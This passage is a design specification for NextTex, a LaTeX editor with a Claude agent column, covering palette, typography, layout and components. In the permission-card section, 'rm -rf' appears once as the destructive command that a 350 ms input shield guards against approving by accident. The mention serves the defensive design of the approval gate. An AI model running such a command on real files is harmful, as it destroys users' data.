# NextTex, Design Specification

> This document is the reference for all front-end work. It was produced before
> implementation and the built UI is reviewed against it. When the implementation
> and this document disagree, that is a bug in one of them: decide which, and
> fix that one. Do not let them drift silently.

## 1. Design direction

**The composing room.** The rendered PDF is the only white object the *app* chooses;
everything around it is the grey surround of a proofing table, and the only saturated colour
in the entire chrome is the pen the agent writes with.

> Revised. This sentence used to read "the only white object on screen", flatly, and §23
> records why it could not stay that way: a writer may now set the editor page to paper
> white, and three of them will. The rule the sentence was protecting is still the rule,
> the app is drawn on proofing grey and defaults to it, and nothing in the chrome is ever
> white, but the editor page is the one surface the writer may overrule, because the object
> it holds is the thing they are *making* rather than the thing they are *judging*. The
> claim is now about what the app picks, not about what can be on screen.

§23 also records the other half of the light theme, which is that it is no longer light all
the way through. The rail, the agent column, the status strip and everything that floats are
furniture, and they take the dark palette even while the theme is light, so the light theme
is a lit editor and a lit page set into dark furniture, rather than a cloud. This comes from the practice of judging
printed matter: you set proofs against a neutral mid-grey, never against white, because
white chrome around a white page makes the page stop reading as an object. It gives NextTex
a light theme no other code editor has, keeps the UI permanently subordinate to the typeset
page, and leaves violet free to mean exactly one thing: *Claude touched this*.

*Revised in the visual overhaul, 19 September 2026.* The dark furniture is
gone and the light theme is lit throughout: the rail, the agent column and
the strips on `--surface-2`, the editor on `--surface`, the page field on
`--surround`, all from the light palette. The argument above is about the
field the page lies on, which stays a neutral grey and still makes the page
read as an object; it was never about the rail, which does not touch the
page, and a light editor bracketed by two black columns read as dark mode
with a hole cut in it. Separation between chrome and editor is now a step
of tone rather than a change of palette, which is what the light surfaces
were re-stepped for in §2's table.

Relationship to NexusQC, the sibling app, is deliberate:

| Same hand | Different tool |
|---|---|
| One superfamily, sans + mono, no third face | Adobe Source (publishing lineage), not IBM Plex (corporate lineage) |
| CSS custom properties mapped through Tailwind `@theme inline` | Green-biased grey, not blue graphite |
| 90–180 ms durations, nothing decorative | Accent reserved for the agent, not a global primary |
| Dense 13 px instrument UI, semantic status colours | Light *and* dark, both authored; NexusQC is dark-only |

## 2. Palette

Twelve authored colours per theme, plus the derived ones and the kit's sizes. `--paper` is a
constant `#FFFFFF` in both themes, it is painted by PDF.js and is never themed. `--line` and
the washes are derived, not authored:
`--line: color-mix(in oklab, var(--ink-3) 55%, transparent)`,
`--wash: color-mix(in oklab, var(--ink-3) 12%, transparent)` (a hovered or chosen row),
`--pen-wash: color-mix(in oklab, var(--pen) 12%, transparent)`,
`--hint-wash: color-mix(in oklab, var(--hint) 14%, transparent)`.
The kit's sizes sit beside the palettes on `:root`, never inside one: three radii,
`--nx-radius-control` 4 px, `--nx-radius-card` 8 px and `--nx-radius-sheet` 12 px, and two
heights, `--nx-control` 28 px and `--nx-row` 32 px, bridged into Tailwind as
`rounded-control`, `rounded-card`, `rounded-sheet`, `h-control` and `h-row`. The table is
the palette as of the visual overhaul (3.0.0); the surfaces were re-stepped then so that a
drawer on `--surface-2` and an editor on `--surface` separate by tone with no hairline
between them, and the light frame came up one step with them to keep the ramp rule below.

| Token | Light | Dark | Use |
|---|---|---|---|
| `--surround` | `#BEC3BD` | `#0A0C0B` | App background; the field the PDF sits on |
| `--surface` | `#E8ECE7` | `#121614` | Panes: the editor body, the page field's neighbours |
| `--surface-2` | `#DCE1DB` | `#1A1F1C` | The bar, the drawer, the Claude column, tab bars, strips, code blocks |
| `--surface-3` | `#CDD2CC` | `#262C28` | Pressed states inside a raised surface; a switch's track |
| `--ink` | `#141715` | `#E3E8E2` | Primary text |
| `--ink-2` | `#373B36` | `#B0B5B0` | Secondary text, user messages, consequences |
| `--ink-3` | `#4E534D` | `#909892` | Metadata, file extensions, line numbers, idle dot |
| `--pen` | `#6F2998` | `#C988E7` | Agent identity, SyncTeX highlight, active-file bar, primary button |
| `--hint` | `#00626D` | `#3FC6D2` | Live and interactive states that are *not* the agent: streaming stopped, a switch that is on, a control the eye should find |
| `--error` | `#9F1912` | `#F47365` | Compile errors, destructive hover |
| `--warn` | `#7D5300` | `#D9A539` | The preview is behind the source; chktex severity bars; permission gate bar |
| `--ok` | `#196131` | `#5ABD7B` | The preview matches the source; git clean, added diff lines, resolved-allow dot |

Two constraints govern any change to these, both arithmetic rather than taste, and
both asserted in `frontend/src/contrast.test.ts`.

**The light accents cannot be separated by lightness.** Every one of them has to
clear 4.5:1 on `--surface-2`, which caps all five at a relative luminance of about
0.11, so they sit within seven L\* of one another and always will, in any light
theme that rule governs. The separation is carried by hue and chroma instead:
violet 278°, red 3°, amber 40°, green 140°, teal 186°, each at or near the chroma
ceiling its hue allows at that lightness. Anyone reading the palette and wondering
why the light accents look so close together should stop before reaching for a
brighter value; the value is not available.

**The ink hierarchy can only be opened from the middle.** `--ink-3` sits a quarter
of a point under its own ceiling on `--surface-3` in light, and on its floor in
dark. When the three inks need more separation, and light's `--ink-2` and
`--ink-3` were once 3.5 L\* apart, two steps pretending to be three, it is
`--ink-2` that moves.

**Both themes are authored and chosen, not inherited.** A toggle in the rail
header stamps `data-theme` and the choice is remembered per browser; dark is the
default. `prefers-color-scheme` covers only the first frame before the app
stamps its own choice.

**Both are pitched darker than the original specification.** The light theme is
a proofing grey rather than a white UI, a page cannot be the brightest object
on screen if the chrome around it is also white, and the dark theme's surround
is nearly black so the sheet reads as lit.

All text tokens clear 4.5:1 on their own surface (light `--ink-3` 4.6:1, dark `--ink-3`
4.8:1, `--pen` 6.4:1 light / 6.9:1 dark).

**Neutral hue bias: green, at near-zero chroma** (2–4 points of G above R and B). Two
reasons. First, simultaneous contrast: a warm surround pushes the paper white toward cold
blue, a blue surround pushes it toward yellow; a chromatically near-dead grey leaves
`#FFFFFF` reading as paper. Second, identity, every code editor and NexusQC itself sit on
blue-grey. The bias is faint enough that nobody will call it green; they will call it grey,
and the paper will look whiter than it does in VS Code.

**Pen hue.** `#6F2998` / `#C988E7` sit at ~280–285°; NexusQC's `#6e8cff` is ~226°. Roughly
55° of separation, never confusable side by side. The colour is methyl-violet: the ink of
hectograph duplicators, which is what mid-century thesis copies were printed in. It is
explicitly *not* `#6366F1`, the indigo every AI-built app reaches for.

**The dark surround is deliberately near-black (`#0A0C0B`).** In dark mode the PDF is the
only light source, a lightbox. To make that read as a lit sheet rather than a hole punched
in the UI, the page gets a 1 px `--line` border plus `0 8px 24px rgba(0,0,0,0.55)`. In light
mode the same page gets a hairline border only, no shadow.

*The build gives it a shadow anyway*, `0 1px 4px rgba(0,0,0,0.12)`, a 4 px
ramp, and a design review flagged the disagreement. The build wins here: the
light theme is a proofing grey, and a page with a border and no shadow reads
as pasted onto the pane rather than lying on it. The rule this paragraph was
protecting, that the page is the brightest, most physical object on screen,
is better served by the shadow than by its absence.

Dark is **not** an inversion: inter-surface contrast steps are compressed
(`#0A0C0B → #121614 → #1A1F1C`, 3 to 6 L* apart, versus 4 to 5 in light), and `--ink` is
`#E3E8E2`, never `#FFFFFF`, pure white text beside a pure white PDF page is the fastest way
to make the page stop looking like paper.

## 3. Typography

Google Fonts only. One superfamily, three roles.

- **UI chrome, Source Sans 3** (400/500/600). Humanist, Adobe's publishing programme,
  drawn for small sizes, with genuine tabular figures. Not Inter.
- **Authored prose, Source Serif 4** (400/400 italic/600). Used for exactly one thing: the
  agent's replies, plus the project name in the switcher. Everything the *machine* says is
  sans; everything that is *prose about a document* is serif. Typeface becomes structure
  rather than decoration, and the chat reads as marginalia on a manuscript rather than a
  messaging app. Source Serif is Fournier-derived, so it will never be mistaken for the
  PDF's Times sitting two panes away.
- **Editor and literal machine strings, Source Code Pro** (300 to 700, upright and italic).
  Chosen over JetBrains Mono because it shares the Source skeleton, and because **it ships
  no ligatures**. That is non-negotiable for LaTeX: `--` and `---` must never fuse on screen
  when they are en- and em-dash *source*.

**Every face this app asks for is a face it has loaded.** That sounds like a truism and was
not one. The editor sets a LaTeX comment in italic, and anything the grammar calls emphasis,
and for as long as that highlighting has existed no italic Source Code Pro was imported. A
browser answers a request it cannot meet by making an oblique: the upright outline put
through a shear matrix, which loses the hinting, throws the stems off the pixel grid and
skips the corrections a drawn italic carries in its round shapes. Nothing fails when this
happens. The text is simply a little worse, for years, and the place it shows first is a
comment, which is `--ink-3` on the brightest page the app offers.

The italics are imported now at all five weights, so the ladder is the same shape upright
and slanted and there is no weight where the two disagree about whether a face exists. The
second half is `font-synthesis: none` on `.cm-editor`: with the faces present it changes
nothing, and if one is ever dropped again the text stops rather than quietly degrades.
`frontend/src/fonts.test.ts` asserts the pairing, because the failure this is guarding
against is one nobody can see.

**Grayscale antialiasing belongs to the dark palette, not to the body.**
`-webkit-font-smoothing: antialiased` sat on `body` unconditionally. It throws away
subpixel rendering, which is a third of the horizontal resolution of every stem, and dark
type on a bright ground is exactly where that costs something: the strokes thin and the
page reads washed out rather than crisp. It is declared with each palette now, the way
`--nx-editor-weight-lift` is and for the same reason, so the editor's own ground decides
for the editor while the app decides for itself. Honest about its reach: Blink and WebKit
act on this property on macOS and nowhere else, so on Linux and Windows this changes
nothing at all.

**The gutter is set at a whole number of pixels.** Its size is 0.82 of the text it numbers,
which the stylesheet used to work out itself, putting the line numbers at 11.07px at the
default size and at a fraction of a pixel at every other stop on the ladder. A glyph set at
a fractional size lays its stems across pixel boundaries, and at eleven pixels there is not
enough glyph left to survive it. `applyAppearance` rounds and stamps `--nx-editor-gutter`,
so there is no CSS feature to fall off and a whole number to assert.

**Three things were measured and left alone**, and are recorded here so they are not
measured again. `e2e/shots/text-clarity.spec.ts` renders the same comment-heavy source
across all six grounds at one and two device pixels, which is how these were decided; the
caveat in its header is that headless Chromium has no LCD subpixel antialiasing, so it
compares weight, fit and letterform honestly and subpixel rendering not at all.

- The **weight lift** of 100 on the light grounds was compared against 0 on pure white. At
  400 the prose reads thin against a page that bright, which is the effect the lift exists
  to answer, so it stands at 100 on all four light grounds.
- The **active line wash** is 7% of `--ink-3`, which darkens a bright ground where it
  lightens a dark one. On white that is `#F3F4F3`, taking the prose from 18.9:1 to 17.8:1
  on the one line being typed. That is not a legible difference and it is the conventional
  treatment; it stands.
- **13.5px** is the only fractional stop on the size ladder. 14px is crisper, and it is
  crisper because it is bigger, which is a different offer from a clearer one. The ladder is
  unchanged; the gutter above was the part of this worth fixing, because its size is derived
  rather than chosen and nobody sees the number.

**The mono rule:** monospace means "this is a literal string the machine produced or
consumes": a git SHA, `file:line`, a shell command, a log excerpt, a filename in a chip.
Merely numeric metadata (word counts, build times, diff counts) stays in Source Sans 3 with
`font-variant-numeric: tabular-nums`. No monospace as decoration.

| Role | Family | Size / line-height | Weight / tracking |
|---|---|---|---|
| `micro`: counts, badges, timestamps | Source Sans 3 | 11 / 16 | 500, `+0.004em`, tnum |
| `meta`: secondary labels, tab titles, diagnostic messages | Source Sans 3 | 12 / 18 | 400 |
| `ui`, the default: tree rows, buttons, permission headline | Source Sans 3 | 13 / 20 | 400 (500 buttons) |
| `ui-lg`: pane headings, project name | Source Serif 4 / Sans 3 | 15 / 22 | 600 |
| `prose`: agent messages | Source Serif 4 | 14.5 / 23.5 (1.62) | 400, max 68ch |
| `code`: CodeMirror | Source Code Pro | 13.5 / 1.63 | 400 plus the page's lift |
| the editor's gutter | Source Code Pro | 0.82 of the text, rounded: 11 at the default | 400 |
| `code-sm`: log excerpts, diffs, chip filenames | Source Code Pro | 12 / 18 | 400 |
| `display`: empty states, first-run setup only | Source Serif 4 | 22 / 28 | 600, `-0.01em` |

No all-caps tracked labels anywhere. Sentence case throughout, including buttons.

## 4. Layout

One `100dvh` shell, `overflow: hidden`, four columns with three drag handles. Handles are a
1 px `--line` rule with a 9 px invisible hit zone, 24 px on a coarse pointer; `col-resize`
cursor; double-click resets to default; widths persist to `localStorage` per project.

| Pane | Default | Min | Max |
|---|---|---|---|
| Rail | 240 px | 180 px | 400 px |
| Editor | flex | 420 px |, |
| PDF | flex (splits remaining 50/50 with editor) | 320 px | the pair less the editor's minimum |
| Claude | 380 px | 320 px | 560 px |

**Claude is a docked column, not a slide-over, whenever there is room.** The loop this app
exists for is write → see → ask → see. A slide-over covering the PDF breaks that loop at the
exact moment the user is checking the agent's work.

Breakpoints:

- **≥ 1400 px**: all four docked, and 240 + 380 leaves 780 px for the editor/PDF pair.
- **1100–1399 px**: Claude becomes a slide-over from the right at 380 px, over the PDF,
  with an 8 px shadow and no scrim. Rail still docked.
- **< 1100 px**: rail auto-collapses.
- **< 900 px**: editor and PDF become a two-item segmented toggle, in the *tab
  bar* rather than the status strip: the strip is 26 px and already drops
  segments at that width, and a control that appears only when it has room is
  not a control. Only
  one is mounted.

**Rail collapse is to a 26 px strip carrying one label, not to an icon bar.**
This section originally said zero, and the build does not: collapsing to
nothing leaves no way back except a keyboard shortcut, which is the same hole
the agent button had. What is rejected is the *icon bar*, a 40 px activity
bar is VS Code's shape
and a default. Cmd-B hides the rail entirely; the project name then moves to the left end of
the tab bar as a non-closable chip with the switcher chevron, and the git dirty count moves
into the compile status strip as `main +4`. Nothing is lost and the editor gains 240 px.

**Spacing scale:** 2 / 4 / 6 / 8 / 12 / 16 / 24 / 32; everything quantises to 4. Interactive
row heights: 26 (tree rows, resolved cards), 28 (diagnostic rows, buttons), 32 (tabs), 26
(status strip). Pane padding 8 horizontal / 6 vertical: this is an instrument, not a
document.

**Radius is a hierarchy, not a constant:** 0 on panes and drawers, 3 px on rows, chips,
buttons and inputs, 5 px on cards. No shadows anywhere except the dark-mode PDF page and the
slide-over.

**Diagnostics live in a drawer scoped to the editor pane**, docked below the status strip:
not full-width, not inside the Claude panel. Height 0 when clean; 168 px (six rows) when
open; drag to 320 px.

**It never opens itself.** This section specified an auto-open on the first build that
produced errors, and the implementation deliberately did not do it. The build fires 1.6
seconds after you stop typing, which is very often mid-thought, and a list of errors
jumping up over the document at that moment, about a sentence you already know is
unfinished, is the most irritating thing this app could do. The strip says `2 errors` and
the gutter marks the lines; opening the drawer is the reader's decision. When it does
open, the first thing in it is the plain-English explanation of the *first* error, which
is the one worth reading.

The strip and the gutter carry the news instead, which is the general rule: say it where
the writer already is, and let them come to the detail.

## 5. Component specs

### File tree row

26 px tall. `padding-left: 10px + depth × 13px`: 13 px is the width of a Source Sans
lowercase *n* at 13 px, so indentation reads as a typographic quad rather than an arbitrary
gap. A 16 px left slot holds an 8 px chevron on folders, nothing on files.

**No file-type icons.** The filename carries its own kind typographically: stem in `--ink`,
extension in `--ink-3`, `02_theory` `.tex`. That reads as a name rather than a path and
scans faster than a colour-coded icon set.

States: rest transparent; hover `--surface-2` with no transition; **active file**
`--surface-2` plus a 2 px `--pen` bar flush against the row's left edge, full height, square;
keyboard focus a 1 px inset `--pen` outline; folder drag-over gets `--pen-wash` fill, a
1 px `--pen` bottom border and the open-folder glyph, for a row from the tree and for
files from the desktop alike (§39). Fill radius 3 px.

Right slot (16 px), in priority order: error count in `--error` micro; unsaved dot (5 px
solid `--ink-2`); git status letter (`M`/`A`/`?`) in `--ink-3` mono 10 px. On row hover that
slot becomes a `⋯` opening, in order: rename, move to…, history, delete version history…,
download, upload here, new file here, new folder here, move to trash. Four items appear
only where they can work and are absent otherwise: *add papers from a folder…* on a
`.bib`, *plot this…* on a dataset, *set as main document* on a `.tex` that is not already
it, and *preview this document* or *stop previewing* depending on which side of the
preview strip the file is on. (This paragraph described a menu of *rename / duplicate /
download / delete / new file here* for some time after the built menu had stopped matching
it, which is the sort of drift this document exists to avoid, and it then drifted twice
more in the correction. It called Duplicate a thing that had been specified and left
unbuilt, by which time it was built, on the tab strip's menu rather than in the tree, over
`POST /duplicate`, with `docs/architecture.md` describing it at length. And the list it gave omitted *delete
version history*, which is the one item on that menu a writer cannot undo.) **Rename is inline**: the label becomes an input in place, same font, same
position, 1 px `--pen` underline, Enter commits, Escape reverts. Never a modal.

Drag-drop upload highlights the target folder row only, never the whole panel. The project
root has no row, so a drop aimed at it, on the empty area below the tree, or on the Files
bar: highlights the **Upload button** instead, which stands in as the root's row.

**Dragging.** A row is draggable onto any folder, and onto the Files bar for the project
root. The row being dragged drops to 50 % opacity so the gesture has a visible subject; the
folder under the pointer takes the same `--pen-wash` fill and `--pen` underline a file drop
from the desktop gets, because to the writer they are the same act. A destination that
cannot take it, the folder itself, its own descendant, or the folder it already sits in,
shows no highlight at all and the cursor says *no*: refused while it is being dragged
rather than attempted and reported.

### Reading mode and writing mode

A **double click on a pane's header gives that pane the window**, and a second double click
restores the layout exactly as it was rather than unfolding everything. A writer who had
the agent hidden before they started reading does not want it back for having read a page.
The preview's header and the source's tab strip both do this; the agent's does not, because
a column of conversation with nothing to converse about is not a mode anybody wants.

The two modes are not symmetric. **Reading folds everything but the page.** **Writing folds
everything but the source and the file list**: somebody writing is still moving between
chapters, and a mode that hides the way to the next one is a mode they leave immediately;
somebody reading the typeset page has nothing to navigate to. Writing mode brings the file
list back even at a width where the window had folded it away on its own, because asking
for the mode is an explicit request for it, and leaving the mode gives the window its
own behaviour back.

It is deliberately **not persisted**. What reaches `localStorage` is the arrangement the
writer chose, so a reload in the middle of a mode comes back to their real layout rather
than to a collapsed window with no memory of what preceded it. Folding anything by hand
ends the mode for the same reason: the layout it would restore is no longer the one they
left.

A **single click on the same headers folds that pane away**, which means one target answers
two gestures, and the fold has to wait 250 ms to find out which it is. That is the shortest
wait that does not turn a deliberate double click into a fold followed by a mode. The
agent's header, which has no second gesture, folds immediately.

**On both panes the target is the tab in front, and the empty run of the strip** (§33).
For a year the source pane's target was the empty run alone, never a tab, on the reasoning
that it was the only part of the row that was not already something, and that its
shrinking to nothing as tabs filled the strip was right rather than a limitation. A resume
project with a dozen variations open changed the writer's mind: there was no run left on
either pane, and they asked for the tab in front to carry the gesture. A click on any other
tab is still only a selection, and a double-click on one selects it and folds nothing.
Below 900 px, where the two panes share one view, neither gesture exists: there is nothing
to fold them into.

**Each mode has a key**, `⌘⌥R` for reading and `⌘⌥E` for writing, the same key again giving
the layout back (§32). They were added as the route that never shrinks, when the strip full
meant no run left to double click; they stay, because a key is a good route whether or not
the gesture has a handle.

### Files bar

26 px, directly under the 32 px project header, and the header's bottom rule moves down
onto it so the two read as one masthead rather than two stacked bands. Fill is `--surface`,
the same plane as the tree: `--surface-2` is the tree row's own hover fill, and a permanent
band of it above rows that hover to it reads as a stuck hover.

Three controls, abutting, no gap, in the header's own button style (`quiet t-micro
h-[26px] rounded-[3px] px-2`): **New file**, **New folder**, **Upload**. A container query
shortens the first two to *File* and *Folder* below 208 px; both short forms are substrings
of the accessible name, so a spoken command matching what is on screen still works. A 22 px
magnifier sits at the right end, past the spacer, and opens the filter row below.

It exists because the alternative was a reachability hole rather than a convenience gap.
Every file operation hung off a row's `⋯` menu, so there had to *be* a row: a new project is
created as one empty document, and its first folder could only be made by opening the menu
on `main.tex` and knowing that "New folder here" resolves to the folder containing it. The
cost is one tree row of a rail that is usually 800–1000 px tall.

The bar does not grow. No collapse-all, ArrowLeft already collapses a folder.

**The filter row.** One 26 px row under the bar, shown only when the magnifier is pressed:
a full-width borderless input on `--surface-2` reading *Find a file*, with a match count in
`t-micro` at the right. Typing filters the tree to the matching rows and the folders on the
way down to them, drawing every folder open without touching what the writer had collapsed
, so clearing the box gives back the tree they had rather than one unfolded on their
behalf. Escape clears the query, and Escape again closes the row and returns focus to the
tree. Rows keep their ordinary indent and typography; there is no match highlight, because
`--pen` means *the agent touched this* and a second accent would be a new colour. A query
that matches nothing gets one `t-meta` row saying so, in the writer's own words back to
them.

### Upload chooser

A popover (`fixed`, 264 px, radius 5, `shadow-float`) rather than a modal.
`role="dialog"` without `aria-modal`, because the page behind it stays live and is not
inert; focus is not trapped, and Escape, Cancel or a click away all discard the picked
files and return focus to whatever started the upload.

This section used to say "never a modal: this app has none", and other sections cited
it. It was already untrue when it was written: access and sharing are both `aria-modal`
sheets over an `.nx-scrim`, and settings joined them when it outgrew its popover. So the
rule is narrower and it is the useful one. **A surface is modal when the thing it is
about is the whole of what you are doing**, setting a password, sharing a project,
changing how the application looks, and not otherwise. The upload chooser is not: it is
a step in an action that started in the file tree and ends there, and the tree behind it
is what the writer is choosing a destination in. A modal is also a promise that one
outside click will not both dismiss the surface and press what is under it, which is why
they are for surfaces with consequences and not for menus.

**The file picker opens first, and this appears afterwards.** Asking "which folder?" before
a file has been chosen is two deliberate steps every time; asking after means the popover
already knows the filenames, so *where* and *one of these already exists* are answered in
one surface instead of a wizard. It therefore only appears when there is something to ask:
a file dropped on a folder has named its destination by being dropped there and goes
straight in unless a name collides.

Inside: a heading naming the file or counting them; a destination row that expands a
`role="listbox"` of every folder, indented on the tree's own 13 px quad, selection following
focus, with **New folder here** below a rule as a plain button outside the list; a manifest
of one 22 px row per file, each with a `Skip` toggle; and, only when something collides, a
count, a two-button group (**Replace** / **Keep both**) and a line saying what that will do.

**Replace is the default.** The dominant case is re-exporting a figure, and it is only a
safe default because what it replaces is now kept. "Keep both" as a default quietly fills a
thesis with `plot (2).png` and then compiles the wrong one.

**Each row says the name it is about to be given.** The rows already said which files
collided and whether they would be replaced or kept, but "keeps both" does not say what
the file will be called, and the line underneath could name it only when exactly one file
collided; every other case got "The new ones come in numbered", which is the question
answered with the fact that it has an answer. The names are worked out in order, because
the answer for one upload depends on the ones before it: uploading `plot.png` and
`plot (2).png` into a folder that already holds `plot.png` gives the first of them the name
the second already has, and two rows each computed against the folder alone would both
promise `plot (2).png`.

### Editor tab

32 px tall, 10 px horizontal padding, max 200 px, and a tab squeezes to 72 px before the
strip overflows, the way a browser's do (§32; it was a fixed 96 px minimum). Label at
`meta` 12 px, stem `--ink` on the tab in front and `--ink-2` on the others, extension
`--ink-3`; overflow truncates the **stem from the middle** so the extension survives:
`04_o-nitro…mics.tex`. One component draws the tab for both strips, `TabStrip` in one
`PaneHeader` (§33), so none of this can differ between them.

Tabs are separated by 1 px `--line` rules, not pills. The **active** tab takes `--surface`
(identical to the editor body, so it merges into the canvas), carries a 2 px `--pen` bar
along its *top* edge, and has no bottom border. Inactive tabs sit on `--surface-2` with a
1 px bottom line. A file with errors turns its extension `--error` and puts the count after
the label, as a number rather than a coloured dot, because the number says the same thing
without depending on being able to see the colour. Middle-click closes. Overflow scrolls
horizontally with a hidden scrollbar, under a wheel turned over the strip as well as by
trackpad, plus a 24 px count at the right of the tabs out of sight; pressing it lists them
and choosing one brings it in front, and the strip follows the tab in front (§32). The
preview strip is the same object, with the same count, list and wheel. **The tab in front
is the pane's header** as well as a tab (§33): a click on it folds the pane and a
double-click gives the pane the window, the gestures the empty run of the strip carries,
because a writer with a dozen files open has no empty run left.

**There is no dirty state on a tab**, and this section described one for two rewrites after
it stopped being true. It said the close × was replaced by a hollow `--ink-2` ring while a
file was unsaved. A keystroke goes into the shared document as it is made and the server
writes it out a moment later, so "typed but not written" is false at every moment anybody
could look at it, and the ring it specified could never have appeared.

Tab switching is instantaneous: content swaps in the same frame, no crossfade.

**Right-clicking the tab in front opens a menu**: *Close the others*, *Close all to the
right*, *Close all*, a rule, then *Duplicate* and *Download* (§39). Only the tab in front,
because the items are about the file being written and a menu on any other tab would have
to say which file it meant; a right-click anywhere else in the strip is left entirely
alone, browser menu and all, since taking that away without putting something in its place
is a loss for nothing. *Close the others* is disabled rather than absent when it is the
only tab open, and *Close all to the right* when the tab is the last; the panel is
`position: fixed`, not absolute, because the strip is a horizontal scroll box and would
clip it, which is the same bug the file tree's row menu hit inside its own.

The menu claims `role="menu"` and keeps the promise, through `menu-keys.ts`: focus on the
first row when it opens, arrows that walk and wrap, Escape. It did not claim the role for
two rewrites, with the file tree's reasoning that a column of buttons should not, and the
preview strip's menu did; §33 gave the two one component, and one answer.

**The preview strip's tab in front has the same menu**, minus *Duplicate*, which is about a
file and not a build, plus *Download PDF*, which is about a build and not a file: *Stop
previewing the others*, a rule, *Download PDF*. *The others* leaves the tab the menu was
opened on, and is disabled when it is alone; there is no *all*, because there is no main
document that stays regardless and the last tab on the strip cannot go (§33). *Download
PDF* fetches that document's own PDF, named after its file, through the same route the
downloads menu uses with `document` naming which. Stopping a preview, by its close
button or by *the others*, closes the source tabs of that document as well, and a
document the strip got by following an opened file leaves when its last file closes;
§34 has the rules and what they refuse to touch.

*Duplicate* copies the file beside itself as `name (copy).ext`, the same naming rule the
trash and the upload chooser use, so there is one implementation of it and no second one
free to drift. It does not open the copy and does not move the view: a duplicate that
steals the pane is a surprise in the middle of editing the original. What it does do is
open the tree's folders as far as the copy and flash its row, because the tree opens
collapsed and a file nobody can see is a menu item that appeared to do nothing. The
file tree's row menu offers it too, since the backlog run; §36 says why it took a
second asking.

### Diagnostic row

28 px collapsed. Grid:
`[3px severity bar] [40px line no.] [8px] [message, flex] [file, auto] [Fix, on hover]`.

Severity bar is a 3 px full-height rule in `--error` or `--warn`: no icons, no badges. Line
number is Source Code Pro 11 px, tabular, right-aligned, `--ink-3`. Message is `meta` 12 px
`--ink`, single-line truncated. If the diagnostic is in a file other than the active one,
the filename appears at the right in `micro` `--ink-3`.

Hover: `--surface-2` fill; the left gutter reveals a disclosure chevron. Click jumps the
editor to the line and flashes it. Selected row keeps a 2 px `--pen` left bar. Expanded, the
row grows to show up to 3 lines of raw TeX log in Source Code Pro 12/18 on `--surface-2`
behind a 1 px `--line` left rule; expansion is instant, no height animation.

A `Fix` button (22 px, 3 px radius, 1 px `--line` border, `micro` label) appears on hover at
the right. It **seeds the Claude composer** with
`Fix: Undefined control sequence \citep (chapters/02_theory.tex:118)` and focuses it, it
does not send. The user always presses Enter on their own message.

**Editor gutter marker:** a 3 px severity-coloured bar filling that line's gutter cell,
aligned with the line-number column. No icon, no glyph. Squiggle is a 1.5 px dotted
underline in `--error` / `--warn` at 60% opacity: dotted, not wavy, because wavy underlines
at 13.5 px on a dense LaTeX line become visual mush.

### Agent message

Not a bubble, not an avatar. Margin-note layout: a 3 px full-height rule at the far left,
`--pen` for Claude, `--line` for the user: then a 12 px gutter, then content. Speaker is
named once at the top in `micro` sentence case (`Claude` in `--pen`), never in caps.
Timestamp appears only on row hover, `micro` `--ink-3` tabular, right-aligned.

Claude's prose is `prose` (Source Serif 4, 14.5/23.5, max 68ch). The user's message is `ui`
13 px `--ink-2` on a `--surface-2` block, 3 px radius, 8 px padding: the visual weight is
deliberately reversed from every chat app, because here the agent's output is the artefact
and the user's prompt is the annotation.

Streaming: text lands in ~50 ms batches, no per-token fade, no typewriter effect. A 2 px ×
1.1em `--pen` caret trails the text; it does **not** blink while tokens are arriving and
blinks at 1.06 s when generation pauses. Code blocks inside messages: `code-sm`,
`--surface-2`, 3 px radius, 8 px padding, no border, copy affordance on hover only. 20 px
between messages, no dividers.

> Revised. The copy affordance was specified here and never built; a code block was a
> bare `<pre>` until the comfort pass. It is a ghost button in the block's top right,
> hidden until hover only where hover exists, so a finger sees it, and it says "Copied"
> for a moment or "Could not copy" when the browser refuses.

### Edit chip

Sits inline in the stream, directly after the sentence that produced it. 24 px tall, 3 px
radius, `--pen-wash` fill, no border. Contents: filename stem in Source Code Pro 12 px, then
`+12 −3` in `micro` tabular (`+` in `--ok`, `−` in `--error`), then on hover `Show` and
`Undo` at the right.

Clicking the chip body expands a unified diff **in place**: max-height 220 px, scrollable,
Source Code Pro 12/18, added lines on `--ok` at 10%, removed on `--error` at 10%, 1 px left
rule, line numbers `--ink-3`. Expansion is instant.

**The connective move:** hovering a chip flashes the corresponding line range in the editor
with `--pen-wash` for as long as the hover is held. That is the cheapest way to answer
"where did it do that" without leaving the chat.

Multiple edits to one file in a single turn collapse into one chip with net counts,
expanding to a grouped diff. `Show` on a file that is not open opens it in a tab, scrolled
to the range, without stealing focus from the composer.

**Undo is a reverse patch, and the spec says what happens when it cannot apply.** While the
patch applies cleanly, `Undo` is live. If the user has typed inside that range since, the
chip drops `Undo`, keeps `Show`, and the hover hint reads `Changed since, can't undo
cleanly`. On undo, the chip collapses to a 20 px struck-through line, `Reverted,
methods.tex`, `--ink-3`, with a `Redo` link live for 10 s. The reverted chip then **stays
in the transcript permanently**. The chat is a record of what was done to the manuscript;
nothing in it ever disappears.

### Resolved permission

One 26 px row, `stream-indent`, a 6 px dot and a `t-micro` line in `--ink-3`. Three states,
not two: `--ok` for what a person allowed, `--ink-3` for what they refused, and `--warn` for
what was allowed without anybody being asked: a rule set earlier, or automatic approval.
An action nobody was asked about is not the same as one the writer allowed, and the record
must not read as though it were. The command itself stays in `t-code-sm`, as it is
everywhere else.

### Permission card

Inline in the stream, not a modal, but it blocks: the composer disables and reads `Waiting
on your approval` in `--ink-3`. Card is `--surface-2`, 1 px `--line` border, 5 px radius,
12 px padding, with a 3 px **`--warn`** left bar. Warn, not pen: this is a gate, not the
agent talking.

1. **Headline**, `ui` 13 px `--ink`, active voice, plain English: `Run a shell command` /
   `Delete figures/old_scan.png` / `Write outside the project`.
2. **The literal thing**, Source Code Pro 12 px on an inset `--surface` block, 8 px padding,
   3 px radius, wrapped, 6 lines then scroll.
3. **Consequence**, one line, `meta` `--ink-2`, only when it is not obvious: `Removes every
   build artefact in build/.`
4. **Buttons**, 28 px, 6 px gap: **Allow** (`--pen` fill, `#FFFFFF` label, 3 px radius,
   13 px/500) · **Allow always** (ghost, 1 px `--line`, `--ink`) · **Deny** (ghost,
   `--ink-2`; on hover label → `--error`, border → `--error`). Keyboard hints `A` / `⇧A` /
   `D` appear in `micro` `--ink-3` inside the buttons when the card holds focus.

`Allow always` shows its scope on hover in `micro` `--ink-3`: `Remembers: shell commands
starting with latexmk`. Scoped by command prefix, never a blanket grant.

**350 ms input shield.** For 350 ms after mount the buttons ignore clicks and keys, at full
opacity, with no visible change. It is the one place in this app that accepts added latency:
a card appearing under a cursor already travelling toward the composer must not be able to
approve `rm -rf` on the way past.

Resolved, the card collapses to a 26 px line, `Allowed, ran latexmk -C`, `--ink-3`, with
